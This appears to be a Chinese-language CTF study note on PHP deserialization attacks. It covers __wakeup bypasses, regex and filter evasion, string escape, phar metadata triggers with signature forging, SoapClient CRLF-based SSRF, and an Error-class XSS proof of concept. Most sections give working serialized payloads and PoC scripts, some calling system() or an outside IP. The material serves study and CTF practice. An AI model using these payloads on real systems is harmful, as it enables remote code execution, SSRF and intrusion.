# php反序列化

## ctfshow

[https://www.cnblogs.com/upstream-yu/p/15194626.html](https:_www.cnblogs.com_upstream-yu_p_15194626)

## 常见魔术方法

```python
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

[「MRCTF2020」- Ezpop_Rocl5的博客-CSDN博客](https://blog.csdn.net/gd_9988/article/details/106111896)

## 反序列化小Trick

### php7.1+反序列化对类属性不敏感

如果变量前是protected，序列化结果会在变量名前加上\x00*\x00

但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\x00*\x00也依然会输出abc

```python
<?php
class test{
    protected $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');
```

### 绕过__wakeup

#### CVE-2016-7124

版本：

PHP5 < 5.6.25

PHP7 < 7.0.10

利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行

对于下面这样一个自定义类

```python
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function __wakeup(){
        $this->a='666';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
```

如果执行`unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');`输出结果为666

而把对象属性个数的值增大执行`unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');`输出结果为abc

#### CVE-2016-7124（2）

```python
<?php
//https://3v4l.org/iLSA7
//https://bugs.php.net/bug.php?id=73367
class obj {
    var $ryat=0;
    function __wakeup() {
        $this->ryat = null;
        throw new Exception("Not a serializable object");
    }
    function __destruct() {
        if ($this->ryat == 1) {
            var_dump('dtor!');
        }
    }
}
echo serialize(new obj());
$poc = 'O:3:"obj":2:{s:4:"ryat";i:1;i:0;O:3:"obj":1:{s:4:"ryat";R:1;}}';
unserialize($poc);
?>
```

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680851546323-c5d0f6c5-7726-49d0-beef-dad9aaa2f850.png#id=nm6ZS&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

反序列化该对象时，由于 $ryat 属性的值是在另一个对象的序列化字符串中设置的，所以 __wakeup() 方法将无法清除该值。因此，即使 __wakeup() 方法被调用，$ryat 属性的值仍然为1。

另外，由于在 $poc 字符串中，对象 obj 被序列化两次，其中一个对象作为另一个对象的属性，当在反序列化第一个对象时，因为它包含了另一个对象作为其属性，所以在反序列化该属性时，将触发第二个对象的反序列化操作，进而调用第二个对象的 __wakeup() 方法。

因此，尽管 **wakeup() 方法被调用并抛出了一个异常，但由于对象属性的值仍然保留了原来的值，所以 **wakeup() 方法对绕过攻击并没有什么作用。

#### 用c代替o

条件：

- 5.3.0 - 5.3.29
- 5.4.0 - 5.4.45
- 5.5.0 - 5.5.38
- 5.6.0 - 5.6.40
- 7.0.0 - 7.0.33
- 7.1.0 - 7.1.33
- 7.2.0 - 7.2.34
- 7.3.0 - 7.3.28
- 7.4.0 - 7.4.16
- 8.0.0 - 8.0.3
- 只能执行construct()函数，无法添加任何内容

```python
<?php
//https://3v4l.org/YAje0
//https://bugs.php.net/bug.php?id=81151
class E  {
    public function __construct(){

    }

    public function __destruct(){
        echo "destruct";
    }

    public function __wakeup(){
        echo "wake up";
    }
}

var_dump(unserialize('C:1:"E":0:{}'));
```

序列化字符串中使用了 C 类型表示一个自定义的 PHP 类型，后面的数字 1 表示这个自定义类型所对应的 PHP 类的名称长度，即 "E" 的长度，紧接着是类名 "E"。

而由于在该例子中，类名 "E" 在反序列化时会被识别为一个自定义的 PHP 类型，所以会自动调用该类的构造函数 **construct() 来构造一个对象，并不会调用 **wakeup() 方法。

因此，对于这个序列化字符串，无法利用 PHP 反序列化漏洞来执行任意代码或绕过安全控制。

[https://blog.acheing.com/index.php/archives/4632/](https://blog.acheing.com/index.php/archives/4632/)

#### 利用反序列化字符串报错 利用条件：

- 7.0.15 - 7.0.33
- 7.1.1 - 7.1.33
- 7.2.0 - 7.2.34
- 7.3.0 - 7.3.28
- 7.4.0 - 7.4.16
- 8.0.0 - 8.0.3
- 利用一个包含**destruct方法的类触发魔术方法可绕过**wakeup方法

```python
<?php

class D {

    public function __get($name) {
        echo "D::__get($name)\n";
    }
    public function __destruct() {
        echo "D::__destruct\n";
    }
    public function __wakeup() {
        echo "D::__wakeup\n";
    }
}

class C {
    public function __destruct() {
        echo "C::__destruct\n";
        $this->c->b;

    }
}


unserialize('O:1:"C":1:{s:1:"c";O:1:"D":0:{};N;}');
```

这个本地复现不成功

成功案例

```python
C::__destruct
D::__get(b)
D::__destruct
```

本地

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680488056997-8b7f15e3-ad99-4c3a-9a9c-0cd0b419b3d7.png#id=S8miL&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

当反序列化一个类名为 "C" 的对象时，它包含一个名为 "c" 的属性，该属性的值是一个类名为 "D" 的对象。在类 "C" 中定义了 **destruct() 方法，当这个对象被销毁时，会输出 "C::**destruct" 并访问属性 "c" 的 "b" 属性。由于在访问 "b" 属性时，该属性所在的对象 "D" 还没有被反序列化，因此 PHP 会自动反序列化对象 "D"，并执行 **get() 方法输出 "D::**get(b)"，最后输出 "D::__destruct"。

#### 绕过新姿势

demo.php

```python
<?php
 
class A
{
    public $info;
    private $end = "1";
 
    public function __destruct()
    {
        $this->info->func();
    }
}
 
class B
{
    public $end;
 
    public function __wakeup()
    {
        $this->end = "exit();";
        echo '__wakeup';
    }
 
    public function __call($method, $args)
    {
        eval('echo "aaaa";' . $this->end . 'echo "bbb"');
    }
}
 
unserialize($_POST['data']);
```

版本

- 7.4.x -7.4.30
- 8.0.x

在以下情况下也会触发此事件。

- 删除)。
- 类属性的数量不一致。
- 属性键的长度不匹配。
- 属性值的长度不匹配。
- 删除；

##### 属性键的长度不匹配

payload （这里是本来end前有两个不可见字符，这里直接写为A，效果是先destruct后wakeup，成功绕过wakeup）

```python
[POST]data=O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:6:"Aend";s:1:"1";}
```

这样也可以。把`s:1:"1";`改为`s:2:"1";`

```python
O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:3:"end";s:2:"1";}
```

##### 内部类属性的数量不一致

```python
O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:3:"end";s:1:"1";} //正常
O:1:"A":2:{s:4:"info";O:1:"B":2:{s:3:"end";N;}s:3:"end";s:1:"1";} //payload
```

##### 删除

```python
O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:3:"end";s:2:"1"
```

[https://www.viewofthai.link/2022/11/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E7%BB%95%E8%BF%87wakeup/](https://www.viewofthai.link/2022/11/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E7%BB%95%E8%BF%87wakeup/)

#### 内置类绕过

例题

```python
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}


?>
```

poc

```python
<?php

class ctfshow {
    public $ctfshow;

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        echo "OK";
        system($this->ctfshow);
    }
     

}
$a=new ctfshow;
$a->ctfshow="whoami";
$arr=array("evil"=>$a);
$oa=new RecursiveArrayIterator($arr);
$res=serialize($oa);
echo $res;
//unserialize($res)
?>

C:22:"RecursiveArrayIterator":77:{x:i:0;a:1:{s:4:"evil";O:7:"ctfshow":1:{s:7:"ctfshow";s:6:"whoami";}};m:a:0:{}}
```

其他类都可以

- ArrayObject::unserialize
- ArrayIterator::unserialize
- RecursiveArrayIterator::unserialize
- SplObjectStorage::unserialize

前面三个的写法都一样，SplObjectStorage特别点

```python
$a = new ctfshow;
$a->ctfshow = "whoami";
$arr = array("evil" => $a);
$oa = new SplObjectStorage();
$oa->aa=$arr;
$res = serialize($oa);
echo $res;
//unserialize($res)
```

### 绕过部分正则

`preg_match('/^O:\d+/')`匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点

- 利用加号绕过（注意在url里传参时+要编码为%2B）
- `serialize(array(a ) ) ; / / a));//a));//a`为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)

```python
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a.PHP_EOL;
    }
}

function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('you lose!');
    }else{
        return $data;
    }
}
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
// serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

### 利用引用（使值相等）

```php
<?php
class test{
  public $a;
  public $b;
  public function __construct(){
    $this->a = 'abc';
    $this->b= &$this->a;
  }
  public function  __destruct(){ 
      if($this->a===$this->b){
        echo 666;
      }
	}
}
$a = serialize(new test());
```

上面这个例子将`$b`设置为`$a`的引用，可以使`$a`永远与`$b`相等

### 16进制绕过字符的过滤

```php
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```

一个例子

```php
<?php
class test{
  public $username;
  public function __construct(){
  	$this->username = 'admin';
	}
  public function  __destruct(){
    echo 666;
  }
}
function check($data){
  if(stristr($data, 'username')!==False){
    echo("你绕不过！！".PHP_EOL);
  }
  else{
    return $data;
  }
}
// 未作处理前
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 做处理后 \75是u的16进制
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

### PHP反序列化字符逃逸

[https://blog.csdn.net/qq_43632414/article/details/120499159](https://blog.csdn.net/qq_43632414/article/details/120499159)

#### 情况1：过滤后字符变多

```php
<?php
function change($str){
    return str_replace("x","xx",$str);
}
$name = $_GET['name'];
$age = "I am 11";
$arr = array($name,$age);
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=$new[1]";
```

正常情况,传入`name=mao`

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680139759637-8b870081-4fc0-47e1-a762-3e1908471eb8.png#id=zbeW6&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680139854421-03313d6f-4373-4bf6-a6d4-4c145652a952.png#id=BcI05&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

首先来看看结果，再来讲解

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680156124526-a34a10e5-b5e8-4dd9-beff-734dcdaebfcd.png#id=SXJ0y&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

我们传入`name=maoxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}`

`";i:1;s:6:"woaini";}`这一部分一共二十个字符

由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符`";i:1;s:6:"woaini";}`，从而造成`";i:1;s:6:"woaini";}`的溢出，而"闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出woaini

最后的;}闭合反序列化全过程导致原来的`";i:1;s:7:"I am 11";}"`被舍弃，不影响反序列化过程

#### 情况2：过滤后字符变少

把反序列化后的两个x替换成为一个

```php
<?php
function change($str){
    return str_replace("xx","x",$str);
}
$arr['name'] = $_GET['name'];
$arr['age'] = $_GET['age'];
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
var_dump($old);
echo "<br/>";
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=";
echo $new['age'];
```

正常情况传入name=mao&age=11的结果

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680156294759-34360aee-ab57-4066-9d14-9e90539aec8b.png#id=whRz8&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

老规矩看看最后构造的结果，再继续讲解

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680156310577-8643cf7d-5284-4063-a8ab-2526866f81dc.png#id=wCnb2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；
我们来看，这部分是age序列化后的结果

```
s:3:"age";s:28:"11";s:3:"age";s:6:"woaini";}"
```

由于前面是40个x所以导致少了20个字符，所以需要后面来补上，`";s:3:"age";s:28:"11这`一部分刚好20个，后面由于有"闭合了前面因此后面的参数就可以由我们自定义执行了

### Fast Destruct

Fast Destruct一般通过破坏序列化字符串的结构来实现，payload如下

```php
$payload = 'a:2:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{}';
$payload = 'a:3:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{}}';
$payload = 'a:2:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{};}';
```

#### Fast Destruct与正常反序列化的区别

1. 正常反序列化

```php
<?php

class B {
    public function __call($f,$p) {
        echo "B::__call($f,$p)\n";
    }
    public function __destruct() {
        echo "B::__destruct\n";
    }
    public function __wakeup() {
        echo "B::__wakeup\n";
    }
}

class A {
    public function __destruct() {
        echo "A::__destruct\n";
        $this->b->c();
    }
}

unserialize('O:1:"A":1:{s:1:"b";O:1:"B":0:{}}');
```

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680188312026-6481a68c-806e-47b3-bb5e-4d0f66f19bff.png#id=EUUoU&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到会先对B类进行一个**wakeup然后A**destruct,然后是对B类的一些操作

1. Fast Destruct

```php
unserialize('O:1:"A":1:{s:1:"b";O:1:"B":0:{};}');
unserialize('O:1:"A":1:{s:1:"b";O:1:"B":0:{}');
unserialize('O:1:"A":2:{s:1:"b";O:1:"B":0:{}}');
```

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680188409120-b739244d-cb76-49b4-803f-045caf06cbd2.png#id=xL7iT&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到**wakeup被放到后面执行了，也就是**destruct()函数被提前执行了

[https://hackerqwq.github.io/2021/08/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8BFast-Destruct/](https://hackerqwq.github.io/2021/08/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8BFast-Destruct/)

### GC机制

```php
<?php
 
error_reporting(0);
class errorr0{
	public $num;
	public function __construct()
	{
		$this->num = new errorr1();
	}
 
}
class errorr1{
    public $err;
	public function __construct()
	{
		$this->err = new errorr2();
	}
}
 
class errorr2{
    public $err = "phpinfo();";
}
 
$a = new errorr0();
$c = array(0=>$a,1=>NULL);
echo serialize($c);
?>
```

[https://blog.csdn.net/qq_51295677/article/details/123520193](https://blog.csdn.net/qq_51295677/article/details/123520193)

## 对象注入

当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。
**对象漏洞**出现得满足两个前提

```php
1、unserialize的参数可控。
2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。
```

比如这个例子

```php
<?php
  class A{
  var $test = "y4mao";
function __destruct(){
  echo $this->test;
}
}
$a = 'O:1:"A":1:{s:4:"test";s:5:"maomi";}';
unserialize($a);
```

在脚本运行结束后便会调用`_destruct`函数，同时会覆盖test变量输出maomi

## 原生类反序列化利用

### SoapClient

综述：

php在安装`php-soap`拓展后，可以反序列化原生类`SoapClient`，来发送`http post`请求。

必须调用`SoapClient`不存在的方法，触发`SoapClient`的`__call`魔术方法。

通过`CRLF`来添加请求体：`SoapClient`可以指定请求的`user-agent`头，通过添加换行符的形式来加入其他请求内容

SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用__call方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述

`ini`配置

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680160533842-eb61edd4-d1f5-4d67-ac3b-6a0b661244a6.png#id=Ds4dd&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```php
<?php
$a = new SoapClient(null,array('location'=>'http://49.233.121.53:54/aaa', 'uri'=>'http://49.233.121.53:54'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680160731672-c80b9d00-aeeb-43a7-876c-6da0daf7f346.png#id=SOnQ4&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

从上面这张图可以看到，SOAPAction处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的**CRLF**即插入**\r\n**，利用成功！

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680160771406-b549b263-1dbd-4982-b585-c328da225ed2.png#id=ZN8ib&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头Content-Type: application/x-www-form-urlencoded但Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据

接下来我们实验一下![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680160800712-944bf884-99f9-4293-b7de-72693a01aeec.png#id=WoBi1&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 实战

反序列化我们传入的**vip**执行getFlag函数(迷惑人的函数)

```php
<?php
  highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
$vip->getFlag();
//flag.php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
  die('error');
}else{
  $token = $_POST['token'];
  if($token=='ctfshow'){
    file_put_contents('flag.txt',$flag);
  }
}
```

由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF访问127.0.0.1/flag.php,即可绕过cloudfare代理

```php
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$headers = array(
    'X-Forwarded-For: 127.0.0.1,127.0.0.1',
    'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' => "aaab"));
$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo urlencode($aaa);
```

接下来访问flag.txt即可

[https://www.cnblogs.com/20175211lyz/p/11515519.html](https:_www.cnblogs.com_20175211lyz_p_11515519)

### phar

phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。

在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发

php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如`(fopen(),copy(),file_exists()和filesize()`。`phar://`就是一种内置的流包装器。

php中一些常见的流包装器如下：

```
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

#### phar文件的结构

```
stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
content:被压缩文件的内容
signature (可空):签名，放在末尾。
```

如何生成一个phar文件？下面给出一个参考例子

```
<?php
    class Test {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new Test();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

#### 漏洞利用条件

1. phar文件要能够上传到服务器端。
2. 要有可用的魔术方法作为“跳板”。
3. 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。

#### 受影响的函数

知道创宇测试后受影响的函数列表：

![](php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1680162807177-0a043bc7-ab0c-4e54-81cb-cfa291f60bde.png#id=OpGmw&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```php
//exif
exif_thumbnail
  exif_imagetype

  //gd
  imageloadfont
    imagecreatefrom***系列函数

    //hash

    hash_hmac_file
    hash_file
    hash_update_file
      md5_file
      sha1_file

        // file/url
        get_meta_tags
        get_headers

          //standard 
          getimagesize
          getimagesizefromstring

          // zip   
          $zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';

//配合其他协议：(SUCTF)
//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
//php://filter/read=convert.base64-encode/resource=phar://phar.phar

//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
<?php
  $pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
@$pdo->pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
?>

// Mysql
//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
//配置一下mysqld:
//[mysqld]
//local-infile=1
//secure_file_priv=""

<?php
class A {
  public $s = '';
  public function __wakeup () {
    system($this->s);
  }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'testtable', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
?>
```

#### 绕过方式

##### 绕过前缀

当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://等绕过

```
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
```

当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。

php://filter/read=convert.base64-encode/resource=phar://phar.phar

##### 图片检测绕过

GIF格式验证可以通过在文件头部添加GIF89a绕过

1、`$phar->setStub(“GIF89a”.“<?php __HALT_COMPILER(); ?>”);` //设置stub

2、生成一个`phar.phar`，修改后缀名为`phar.gif`

##### 绕过前后脏数据

```php
<?php
  CLASS FLAG {
  public function __destruct(){
    echo "FLAG: " . $this->_flag;
  } 
  }
  $sb = $_GET['sb'];
$ts = $_GET['ts'];
$phar = new Phar($sb.".phar"); //后缀名必须为phar
**$phar = $phar->convertToExecutable(Phar::TAR); //会生成*.phar.tar**

$phar->startBuffering();
$phar->addFromString("Time: ".$ts." IP: [], REQUEST: [log_type=".$sb."], CONTENT: [", ""); //添加要压缩的文件
//tar文件开头是第一个添加文件的的文件名，注意添加的文件顺序不要错了
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new FLAG();
$o -> data = 'g0dsp3ed_1s_g0D';
$phar->setMetadata($o); //将自定义的meta-data存入manifest
//签名自动计算
$phar->stopBuffering();
?>
```

[https://www.cnblogs.com/yyy2015c01/p/phar-deserialization.html](https:_www.cnblogs.com_yyy2015c01_p_phar-deserialization)

[[http://home.ustc.edu.cn/](http://home.ustc.edu.cn/)xjyuan/blog/2019/11/13/phar-unserialize/#::text=phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%B3%E5%9C%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%EF%BC%88%20file_exists%20%28%29%20%E3%80%81%20is_dir%20%28%29,%E7%AD%89%EF%BC%89%E5%8F%82%E6%95%B0%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E9%85%8D%E5%90%88%20phar%3A%2F%2F%E4%BC%AA%E5%8D%8F%E8%AE%AE%20%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%B8%8D%E4%BE%9D%E8%B5%96%20unserialize%20%28%29%20%E7%9B%B4%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%93%8D%E4%BD%9C%E3%80%82]([http://home.ustc.edu.cn/](http://home.ustc.edu.cn/)xjyuan/blog/2019/11/13/phar-unserialize/#::text=phar反序列化即在文件系统函数（ file_exists () 、 is_dir (),等）参数可控的情况下，配合 phar%3A%2F%2F伪协议 ，可以不依赖 unserialize () 直接进行反序列化操作。)

#### 修改签名

先生成phar文件

```php
<?php
class getflag{

}

$c=new getflag();
$phar = new Phar("phar1.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata([0=>$c,1=>NULL]); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

通过txt修改文件后

sha1签名为例

```python
from hashlib import sha1
f = open('./phar1.phar', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
h = f[-8:] # 获取签名类型以及GBMB标识
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('phar2.phar', 'wb').write(newf) # 写入新文件
```

[https://blog.csdn.net/cosmoslin/article/details/120797688](https://blog.csdn.net/cosmoslin/article/details/120797688)

#### 题目

##### soeasy_php

[https://blog.csdn.net/qq_51295677/article/details/124475824](https://blog.csdn.net/qq_51295677/article/details/124475824)

考点:使symlink报错、phar竞争

### Error/Exception

#### XSS

##### Error 内置类

- 适用于php7版本
- 在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个`__toString()`的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 `echo <Object>`的写法，当 PHP 对象被当作一个字符串输出或使用时候（如`echo`的时候）会触发`__toString`方法，这是一种挖洞的新思路。

下面演示如何使用 Error 内置类来构造 XSS。

测试代码：

```php
<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>
```

（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）

给出POC：

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>

